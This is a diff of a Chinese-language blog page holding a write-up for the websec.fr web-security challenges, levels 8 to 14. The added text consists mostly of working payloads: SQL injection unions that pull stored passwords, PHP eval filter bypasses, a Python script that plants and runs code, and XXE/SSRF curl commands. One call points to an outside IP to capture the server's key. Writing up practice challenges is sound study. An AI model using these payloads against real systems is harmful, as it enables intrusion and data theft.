@@ -19,8 +19,8 @@
     <!-- 设置密码 -->
     <script>
         (function(){
-            if(''){
-                if (prompt('请输入文章密码','') !== ''){
+            if('websec.fr'){
+                if (prompt('请输入文章密码','') !== 'websec.fr'){
                     alert('密码错误！');
                     history.back();
                 }
@@ -267,7 +267,7 @@
                 
                 
                     <div class="post-intro-read">
-                        <span>Word count: <span class="post-count">4,887</span> / Reading time: <span class="post-count">28 min</span></span>
+                        <span>Word count: <span class="post-count">6,021</span> / Reading time: <span class="post-count">35 min</span></span>
                     </div>
                 
                 <div class="post-intro-meta">
@@ -470,6 +470,11 @@
 <p>改进版:</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select id, login from users where id = 5 union select (select 2)g, (select x3 from (select * from (select 4 x1)a,(select 2 x2)b, (select 3 x3)c union select * from users)d where x1 between 1 and 1)f;</span><br></pre></td></tr></table></figure>
 <p><code>WEBSEC{Because_blacklist_based_filter_are_always_great}</code></p>
+<p>其他payload:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">99 union select b,c from(select 1 a, 2 b, 3 c where 1 in (4) union select * from users)x where a between 1 and 1</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">3 union select (WITH RECURSIVE cnt(x,y,z) AS (select * from users) SELECT z FROM cnt where nullif(x,2)),1</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">select id,login from users where id=9 union select b,c from (select 1 as a,2 as b,3 as c where 1 in (2) union select * from users where id in (1))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">null -- using an illegal user id, so that we don&apos;t get rows from the original select</span><br><span class="line"></span><br><span class="line">union</span><br><span class="line"></span><br><span class="line">select 1, c from (</span><br><span class="line">    select null, null, null as c -- using any name works, as long as we name the third column</span><br><span class="line">    from (select 1 where null) -- selecting from an empty table ensures that this part doesn&apos;t actually contribute to the join</span><br><span class="line"></span><br><span class="line">    union</span><br><span class="line"></span><br><span class="line">    select * from users -- now we can use select *. union renames `password` to `c`</span><br><span class="line">    where id between 1 and 1 -- again, we want exactly one row. Since we can&apos;t use = or -, we use between</span><br><span class="line">)</span><br></pre></td></tr></table></figure>
+<h1 id="level9"><a href="#level9" class="headerlink" title="level9"></a>level9</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">ini_set(&apos;display_errors&apos;, &apos;on&apos;);</span><br><span class="line">ini_set(&apos;error_reporting&apos;, E_ALL);</span><br><span class="line">if( isset ($_GET[&apos;submit&apos;]) &amp;&amp; isset ($_GET[&apos;c&apos;])) &#123;</span><br><span class="line">    $randVal = sha1 (time ());</span><br><span class="line"></span><br><span class="line">    setcookie (&apos;session_id&apos;, $randVal, time () + 2, &apos;&apos;, &apos;&apos;, true, true);</span><br><span class="line"></span><br><span class="line">    try &#123;</span><br><span class="line">        $fh = fopen(&apos;/tmp/&apos; . $randVal, &apos;w&apos;);</span><br><span class="line"></span><br><span class="line">        fwrite (</span><br><span class="line">            $fh,</span><br><span class="line">                   str_replace (</span><br><span class="line">                [&apos;&lt;?&apos;, &apos;?&gt;&apos;, &apos;&quot;&apos;, &quot;&apos;&quot;, &apos;$&apos;, &apos;&amp;&apos;, &apos;|&apos;, &apos;&#123;&apos;, &apos;&#125;&apos;, &apos;;&apos;, &apos;#&apos;, &apos;:&apos;, &apos;#&apos;, &apos;]&apos;, &apos;[&apos;, &apos;,&apos;, &apos;%&apos;, &apos;(&apos;, &apos;)&apos;],</span><br><span class="line">                &apos;&apos;,</span><br><span class="line">                $_GET[&apos;c&apos;]</span><br><span class="line">            )</span><br><span class="line">        );</span><br><span class="line">        fclose($fh);</span><br><span class="line">    &#125; catch (Exception $e) &#123;</span><br><span class="line">        var_dump ($e-&gt;getMessage ());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">if (isset ($_GET[&apos;cache_file&apos;])) &#123;</span><br><span class="line">    if (file_exists ($_GET[&apos;cache_file&apos;])) &#123;</span><br><span class="line">        echo eval (stripcslashes (file_get_contents ($_GET[&apos;cache_file&apos;])));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+<p>payload:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">stripcslashes(&apos;readfile\x28\x27flag.txt\x27\x29\x3b&apos;);</span><br><span class="line"></span><br><span class="line">echo file_get_contents\50\42flag.txt\42\51\73</span><br><span class="line"></span><br><span class="line">include &lt;&lt;&lt;EOT</span><br><span class="line">flag.txt EOT ?&gt;</span><br><span class="line">encode =&gt;</span><br><span class="line">include+&lt;&lt;&lt;EOT%0aflag.txt%0aEOT%0a%3f%3f&gt;&gt;</span><br><span class="line">eval( stripcslashes(urldecode(&apos;include+&lt;&lt;&lt;EOT%0aflag.txt%0aEOT%0a%3f&gt;&apos;)));</span><br><span class="line"></span><br><span class="line">import requests</span><br><span class="line">s = requests.session()</span><br><span class="line">LEVEL09 = &quot;http://websec.fr/level09/index.php&quot;</span><br><span class="line">c = &quot;&quot;&quot;include&lt;&lt;&lt;EOD</span><br><span class="line">flag.txt</span><br><span class="line">EOD</span><br><span class="line">??&gt;&gt;&quot;&quot;&quot;</span><br><span class="line">param = &#123;&quot;c&quot;:c,&quot;submit&quot;:&quot;OK&quot;&#125;</span><br><span class="line">r = s.get(LEVEL09,params=param)</span><br><span class="line">file_cache = r.cookies[&apos;session_id&apos;]</span><br><span class="line">param = &#123;&quot;cache_file&quot;:&quot;/tmp/&quot;+file_cache,&quot;a&quot;:&quot;1234&quot;&#125;</span><br><span class="line">r = s.get(LEVEL09,params=param)</span><br><span class="line">print r.text</span><br></pre></td></tr></table></figure>
 <h1 id="level8"><a href="#level8" class="headerlink" title="level8"></a>level8</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"> $uploadedFile = sprintf(<span class="string">'%1$s/%2$s'</span>, <span class="string">'/uploads'</span>, sha1($_FILES[<span class="string">'fileToUpload'</span>][<span class="string">'name'</span>]) . <span class="string">'.gif'</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (file_exists ($uploadedFile)) &#123; unlink ($uploadedFile); &#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> ($_FILES[<span class="string">'fileToUpload'</span>][<span class="string">'size'</span>] &lt;= <span class="number">50000</span>) &#123;</span><br><span class="line"><span class="keyword">if</span> (getimagesize ($_FILES[<span class="string">'fileToUpload'</span>][<span class="string">'tmp_name'</span>]) !== <span class="keyword">false</span>) &#123;</span><br><span class="line"><span class="keyword">if</span> (exif_imagetype($_FILES[<span class="string">'fileToUpload'</span>][<span class="string">'tmp_name'</span>]) === IMAGETYPE_GIF) &#123;</span><br><span class="line">move_uploaded_file ($_FILES[<span class="string">'fileToUpload'</span>][<span class="string">'tmp_name'</span>], $uploadedFile);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'&lt;p class="lead"&gt;Dump of &lt;a href="/level08'</span> . $uploadedFile . <span class="string">'"&gt;'</span>. htmlentities($_FILES[<span class="string">'fileToUpload'</span>][<span class="string">'name'</span>]) . <span class="string">'&lt;/a&gt;:&lt;/p&gt;'</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'&lt;pre&gt;'</span>;</span><br><span class="line"><span class="keyword">include_once</span>($uploadedFile);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'&lt;/pre&gt;'</span>;</span><br><span class="line">unlink($uploadedFile);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123; <span class="keyword">echo</span> <span class="string">'&lt;p class="text-danger"&gt;The file is not a GIF&lt;/p&gt;'</span>; &#125;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123; <span class="keyword">echo</span> <span class="string">'&lt;p class="text-danger"&gt;The file is not an image&lt;/p&gt;'</span>; &#125;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123; <span class="keyword">echo</span> <span class="string">'&lt;p class="text-danger"&gt;The file is too big&lt;/p&gt;'</span>; &#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;/div&gt;</span><br><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">endif</span> <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
 <p>这里使用<code>exif_imagetype</code>函数检测图片是否是GIF，该函数仅检查开头几个字节。</p>
 <p>payload, 列目录:</p>
@@ -487,11 +492,38 @@
 <h1 id="level11"><a href="#level11" class="headerlink" title="level11"></a>level11</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">ini_set(<span class="string">'display_errors'</span>, <span class="string">'on'</span>);</span><br><span class="line">ini_set(<span class="string">'error_reporting'</span>, E_ALL);</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">sanitize</span><span class="params">($id, $table)</span> </span>&#123;</span><br><span class="line">    <span class="comment">/* Rock-solid: https://secure.php.net/manual/en/function.is-numeric.php */</span></span><br><span class="line">    <span class="keyword">if</span> (! is_numeric ($id) <span class="keyword">or</span> $id &lt; <span class="number">2</span>) &#123;</span><br><span class="line">        <span class="keyword">exit</span>(<span class="string">"The id must be numeric, and superior to one."</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Rock-solid too! */</span></span><br><span class="line">    $special1 = [<span class="string">"!"</span>, <span class="string">"\""</span>, <span class="string">"#"</span>, <span class="string">"$"</span>, <span class="string">"%"</span>, <span class="string">"&amp;"</span>, <span class="string">"'"</span>, <span class="string">"*"</span>, <span class="string">"+"</span>, <span class="string">"-"</span>];</span><br><span class="line">    $special2 = [<span class="string">"."</span>, <span class="string">"/"</span>, <span class="string">":"</span>, <span class="string">";"</span>, <span class="string">"&lt;"</span>, <span class="string">"="</span>, <span class="string">"&gt;"</span>, <span class="string">"?"</span>, <span class="string">"@"</span>, <span class="string">"["</span>, <span class="string">"\\"</span>, <span class="string">"]"</span>];</span><br><span class="line">    $special3 = [<span class="string">"^"</span>, <span class="string">"_"</span>, <span class="string">"`"</span>, <span class="string">"&#123;"</span>, <span class="string">"|"</span>, <span class="string">"&#125;"</span>];</span><br><span class="line">    $sql = [<span class="string">"union"</span>, <span class="string">"0"</span>, <span class="string">"join"</span>, <span class="string">"as"</span>];</span><br><span class="line">    $blacklist = array_merge ($special1, $special2, $special3, $sql);</span><br><span class="line">    <span class="keyword">foreach</span> ($blacklist <span class="keyword">as</span> $value) &#123;</span><br><span class="line">        <span class="keyword">if</span> (stripos($table, $value) !== <span class="keyword">false</span>)</span><br><span class="line">            <span class="keyword">exit</span>(<span class="string">"Presence of '"</span> . $value . <span class="string">"' detected: abort, abort, abort!\n"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span> ($_POST[<span class="string">'submit'</span>]) &amp;&amp; <span class="keyword">isset</span> ($_POST[<span class="string">'user_id'</span>]) &amp;&amp; <span class="keyword">isset</span> ($_POST[<span class="string">'table'</span>])) &#123;</span><br><span class="line">    $id = $_POST[<span class="string">'user_id'</span>];</span><br><span class="line">    $table = $_POST[<span class="string">'table'</span>];</span><br><span class="line"></span><br><span class="line">    sanitize($id, $table);</span><br><span class="line"></span><br><span class="line">    $pdo = <span class="keyword">new</span> SQLite3(<span class="string">'database.db'</span>, SQLITE3_OPEN_READONLY);</span><br><span class="line">    $query = <span class="string">'SELECT id,username FROM '</span> . $table . <span class="string">' WHERE id = '</span> . $id;</span><br><span class="line">    <span class="comment">//$query = 'SELECT id,username,enemy FROM ' . $table . ' WHERE id = ' . $id;</span></span><br><span class="line"></span><br><span class="line">    $getUsers = $pdo-&gt;query($query);</span><br><span class="line">    $users = $getUsers-&gt;fetchArray(SQLITE3_ASSOC);</span><br><span class="line"></span><br><span class="line">    $userDetails = <span class="keyword">false</span>;</span><br><span class="line">    <span class="keyword">if</span> ($users) &#123;</span><br><span class="line">        $userDetails = $users;</span><br><span class="line">    $userDetails[<span class="string">'table'</span>] = htmlentities($table);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
 <p>由于<code>$table</code>可控，所以，可以通过子查询绕过。</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">user_id=4&amp;table=(select 4 id, enemy username from costume)&amp;submit=%E6%8F%90%E4%BA%A4</span><br><span class="line">结果：</span><br><span class="line">WEBSEC&#123;Who_needs_AS_anyway_when_you_have_sqlite&#125;</span><br></pre></td></tr></table></figure>
-<h1 id="level14未解决"><a href="#level14未解决" class="headerlink" title="level14未解决"></a>level14未解决</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">$funcs_internal = get_defined_functions()[<span class="string">'internal'</span>];</span><br><span class="line"></span><br><span class="line"><span class="comment">/* lets allow some secure funcs here */</span></span><br><span class="line"><span class="keyword">unset</span> ($funcs_internal[array_search(<span class="string">'strlen'</span>, $funcs_internal)]);</span><br><span class="line"><span class="keyword">unset</span> ($funcs_internal[array_search(<span class="string">'print'</span>, $funcs_internal)]);</span><br><span class="line"><span class="keyword">unset</span> ($funcs_internal[array_search(<span class="string">'strcmp'</span>, $funcs_internal)]);</span><br><span class="line"><span class="keyword">unset</span> ($funcs_internal[array_search(<span class="string">'strncmp'</span>, $funcs_internal)]);</span><br><span class="line"></span><br><span class="line">$funcs_extra = <span class="keyword">array</span> (<span class="string">'eval'</span>, <span class="string">'include'</span>, <span class="string">'require'</span>, <span class="string">'function'</span>);</span><br><span class="line">$funny_chars = <span class="keyword">array</span> (<span class="string">'\.'</span>, <span class="string">'\+'</span>, <span class="string">'-'</span>, <span class="string">'\*'</span>, <span class="string">'"'</span>, <span class="string">'`'</span>, <span class="string">'\['</span>, <span class="string">'\]'</span>);</span><br><span class="line">$variables = <span class="keyword">array</span> (<span class="string">'_GET'</span>, <span class="string">'_POST'</span>, <span class="string">'_COOKIE'</span>, <span class="string">'_REQUEST'</span>, <span class="string">'_SERVER'</span>, <span class="string">'_FILES'</span>, <span class="string">'_ENV'</span>, <span class="string">'HTTP_ENV_VARS'</span>, <span class="string">'_SESSION'</span>, <span class="string">'GLOBALS'</span>);</span><br><span class="line"></span><br><span class="line">$blacklist = array_merge($funcs_internal, $funcs_extra, $funny_chars, $variables);</span><br><span class="line"></span><br><span class="line">$insecure = <span class="keyword">false</span>;</span><br><span class="line"><span class="keyword">foreach</span> ($blacklist <span class="keyword">as</span> $blacklisted) &#123;</span><br><span class="line">    <span class="keyword">if</span> (preg_match (<span class="string">'/'</span> . $blacklisted . <span class="string">'/im'</span>, $code)) &#123;</span><br><span class="line">        $insecure = <span class="keyword">true</span>;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> ($insecure) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">'Insecure code detected!'</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">eval</span> ($code);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<h1 id="level12"><a href="#level12" class="headerlink" title="level12"></a>level12</h1><p>参考链接: <a href="https://www.anquanke.com/post/id/167140#h3-2" rel="external nofollow" target="_blank">https://www.anquanke.com/post/id/167140#h3-2</a></p>
+<p>首先通过finfo得到源码:</p>
+<p><code>new finfo(&#39;1&#39;, &#39;/&#39;)</code></p>
+<p>略长，没有完全给出。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">/*</span><br><span class="line">Congratulation, you can read this file, but this is not the end of our journey.</span><br><span class="line"></span><br><span class="line">- Thanks to cutz for the QA.</span><br><span class="line">- Thanks to blotus for finding a (now fixed) weakness in the &quot;encryption&quot; function.</span><br><span class="line">- Thanks to nurfed for nagging us about a cheat</span><br><span class="line">*/</span><br><span class="line"></span><br><span class="line">$text = &apos;Niw0OgIsEykABg8qESRRCg4XNkEHNg0XCls4BwZaAVBbLU4EC2VFBTooPi0qLFUELQ==&apos;;</span><br><span class="line">$key = ini_get (&apos;user_agent&apos;);</span><br><span class="line"></span><br><span class="line">if ($_SERVER[&apos;REMOTE_ADDR&apos;] === &apos;127.0.0.1&apos;) &#123;</span><br><span class="line">    if ($_SERVER[&apos;HTTP_USER_AGENT&apos;] !== $key) &#123;</span><br><span class="line">        die (&quot;Cheating is bad, m&apos;kay?&quot;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    $i = 0;</span><br><span class="line">    $flag = &apos;&apos;;</span><br><span class="line">    foreach (str_split (base64_decode ($text)) as $letter) &#123;</span><br><span class="line">        $flag .= chr (ord ($key[$i++]) ^ ord ($letter));</span><br><span class="line">    &#125;</span><br><span class="line">    die ($flag);</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+<p>然后还需要获取php.ini中的user-agent。由于路径未知，所以需要其他办法。</p>
+<p>虽然过滤了<code>splfileobject</code>, <code>globiterator</code>, <code>filesystemiterator</code>, and <code>directoryiterator</code>，但是可以绕过。</p>
+<p><code>new \SplFileObject(&quot;http://39.106.97.201&quot;, 1)</code></p>
+<p>绕过原因:</p>
+<p><strong>Without any namespace definition, all class and function definitions are placed into the global space - as it was in PHP before namespaces were supported. Prefixing a name with <em>\</em> will specify that the name is required from the global space even in the context of the namespace.</strong></p>
+<p>得到user-agent:</p>
+<p><img src="/assets/websec/TIM截图20181205222022.png" alt=""></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$key = &quot;aiviGohdahvueL0dedi5hievi0Ahsh1aor9aiQu5eemaisi7Phai9PhohpheiweiP7eifooVooviesh9meighoolahm3Phe0Ii6gieL1Pidoodiephein3iK8tae3aec&quot;;</span><br><span class="line">$text = &quot;Niw0OgIsEykABg8qESRRCg4XNkEHNg0XCls4BwZaAVBbLU4EC2VFBTooPi0qLFUELQ==&quot;;</span><br><span class="line">$flag = &quot;&quot;;</span><br><span class="line">foreach (str_split (base64_decode ($text)) as $letter) &#123;</span><br><span class="line">    $flag .= chr (ord ($key[$i++]) ^ ord ($letter));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">echo $flag;</span><br></pre></td></tr></table></figure>
+<p>得到flag.</p>
+<p>其他payload:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">得到源码:</span><br><span class="line">curl -s --data &apos;submit=&amp;class=SimpleXMLElement&amp;param2=2&amp;param1=&lt;!DOCTYPE xxe [&lt;!ENTITY foo SYSTEM &quot;php://filter/read=convert.base64-encode/resource=/index.php&quot;&gt;]&gt;&lt;root&gt;%26foo;&lt;/root&gt;&apos; http://websec.fr/level12/index.php | grep -oE -m1 &apos;&lt;pre&gt;(.*)&lt;/pre&gt;&apos;</span><br><span class="line">可以继续获取php.ini，路径未知，</span><br><span class="line">也可以:</span><br><span class="line">通过ssrf获取flag:</span><br><span class="line">curl -s --data &apos;submit=&amp;class=SimpleXMLElement&amp;param2=2&amp;param1=&lt;!DOCTYPE xxe [&lt;!ENTITY foo SYSTEM &quot;http://127.0.0.1/level12/index.php&quot;&gt;]&gt;&lt;root&gt;%26foo;&lt;/root&gt;&apos; http://websec.fr/level12/index.php | grep -oE -m1 &apos;WEBSEC&#123;.*&#125;&apos;</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">It&apos;s possible to bypass the class filter by using Global namespace, thus we can use \SplFileObject along with a php://filter in order to read the whole file, as in:</span><br><span class="line"></span><br><span class="line">curl -sd &apos;submit=&amp;class=\SplFileObject&amp;param1=php://filter/convert.base64-encode/resource=index.php&amp;param2=r&apos; http://websec.fr/level12/index.php | grep -oE &apos;&lt;pre&gt;(.*)&lt;/pre&gt;&apos;</span><br><span class="line">The page source we get (encoded in base64) contains some php codes that hint at using SSRF to decrypt the $flag with the server&apos;s $key = ini_get (&apos;user_agent&apos;);, i.e.:</span><br><span class="line"></span><br><span class="line">curl -sd &apos;submit=&amp;class=\SplFileObject&amp;param1=php://filter/convert.quoted-printable-encode/resource=http://127.0.0.1/level12/index.php&amp;param2=r&apos; http://websec.fr/level12/index.php | grep -oE &apos;WEBSEC&#123;.*&#125;&apos;</span><br></pre></td></tr></table></figure>
+<h1 id="level14"><a href="#level14" class="headerlink" title="level14"></a>level14</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">$funcs_internal = get_defined_functions()[<span class="string">'internal'</span>];</span><br><span class="line"></span><br><span class="line"><span class="comment">/* lets allow some secure funcs here */</span></span><br><span class="line"><span class="keyword">unset</span> ($funcs_internal[array_search(<span class="string">'strlen'</span>, $funcs_internal)]);</span><br><span class="line"><span class="keyword">unset</span> ($funcs_internal[array_search(<span class="string">'print'</span>, $funcs_internal)]);</span><br><span class="line"><span class="keyword">unset</span> ($funcs_internal[array_search(<span class="string">'strcmp'</span>, $funcs_internal)]);</span><br><span class="line"><span class="keyword">unset</span> ($funcs_internal[array_search(<span class="string">'strncmp'</span>, $funcs_internal)]);</span><br><span class="line"></span><br><span class="line">$funcs_extra = <span class="keyword">array</span> (<span class="string">'eval'</span>, <span class="string">'include'</span>, <span class="string">'require'</span>, <span class="string">'function'</span>);</span><br><span class="line">$funny_chars = <span class="keyword">array</span> (<span class="string">'\.'</span>, <span class="string">'\+'</span>, <span class="string">'-'</span>, <span class="string">'\*'</span>, <span class="string">'"'</span>, <span class="string">'`'</span>, <span class="string">'\['</span>, <span class="string">'\]'</span>);</span><br><span class="line">$variables = <span class="keyword">array</span> (<span class="string">'_GET'</span>, <span class="string">'_POST'</span>, <span class="string">'_COOKIE'</span>, <span class="string">'_REQUEST'</span>, <span class="string">'_SERVER'</span>, <span class="string">'_FILES'</span>, <span class="string">'_ENV'</span>, <span class="string">'HTTP_ENV_VARS'</span>, <span class="string">'_SESSION'</span>, <span class="string">'GLOBALS'</span>);</span><br><span class="line"></span><br><span class="line">$blacklist = array_merge($funcs_internal, $funcs_extra, $funny_chars, $variables);</span><br><span class="line"></span><br><span class="line">$insecure = <span class="keyword">false</span>;</span><br><span class="line"><span class="keyword">foreach</span> ($blacklist <span class="keyword">as</span> $blacklisted) &#123;</span><br><span class="line">    <span class="keyword">if</span> (preg_match (<span class="string">'/'</span> . $blacklisted . <span class="string">'/im'</span>, $code)) &#123;</span><br><span class="line">        $insecure = <span class="keyword">true</span>;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> ($insecure) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">'Insecure code detected!'</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">eval</span> ($code);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
 <p>php的tricks:</p>
